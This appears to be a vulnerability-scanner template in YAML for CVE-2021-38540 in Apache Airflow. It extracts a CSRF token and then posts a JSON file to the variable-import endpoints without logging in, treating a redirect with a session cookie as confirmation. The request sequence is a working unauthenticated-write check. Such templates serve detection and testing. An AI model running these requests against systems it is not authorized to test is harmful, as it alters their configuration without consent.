id: 
name: CVE-2021-38540
tags: 
  - Apahce-Airflow
transport: http
set: 
  BaseURL: request.url.host
  randstr: randomLowercase(6)
rules: 
  req: 
    request: 
      cache: false
      method: GET
      path: /login/
      headers:
        Origin: '{{BaseURL}}/login/'

    expression: response.body.bcontains(b'Sign In - Airflow')
    output: 
      csrf: r'type="hidden" value="(.*?)">'.bsubmatch(response.body)['1']

  req2: 
    request: 
      cache: false
      method: POST
      path: /variable/varimport
      headers:
        Origin: '{{BaseURL}}'
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB874qcjbpxTP1Hj7
        Referer: '{{BaseURL}}/admin/variable/'
      body: |
        ------WebKitFormBoundaryB874qcjbpxTP1Hj7
        Content-Disposition: form-data; name="csrf_token"

        {{csrf}}
        ------WebKitFormBoundaryB874qcjbpxTP1Hj7
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
        Content-Type: application/json

        {
            "type": "{{randstr}}"
        }

        ------WebKitFormBoundaryB874qcjbpxTP1Hj7--


    expression: response.status==302 &&
                'Set-Cookie' in response.headers && response.headers['Set-Cookie'].contains('session') &&
                response.body.bcontains(b'You should be redirected automatically to target URL')

  req3: 
    request: 
      cache: false
      method: GET
      path: /admin/variable/
      headers:
        Origin: '{{BaseURL}}/admin/variable/'

    expression: response.status==200 && response.body.bcontains(b'Variables')
    output: 
      csrf: r'name="csrf_token" value="(.*?)"/>'.bsubmatch(response.body)['1']

  req4: 
    request: 
      cache: false
      method: POST
      path: /admin/airflow/varimport
      headers:
        Origin: '{{BaseURL}}'
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB874qcjbpxTP1Hj7
        Referer: '{{BaseURL}}/admin/variable/'
      body: |
        ------WebKitFormBoundaryB874qcjbpxTP1Hj7
        Content-Disposition: form-data; name="csrf_token"

        {{csrf}}
        ------WebKitFormBoundaryB874qcjbpxTP1Hj7
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
        Content-Type: application/json

        {
            "type": "{{randstr}}"
        }
        ------WebKitFormBoundaryB874qcjbpxTP1Hj7--


    expression: response.status==302 &&
                'Set-Cookie' in response.headers && response.headers['Set-Cookie'].contains('session') &&
                response.body.bcontains(b'You should be redirected automatically to target URL')

expression: (req3() && req4()) || (req() && req2())
detail:
  vulnerability:
    proof:
      info: "存在Apahce-Airflow-CVE-2021-38540 未经身份验证的变量导入漏洞"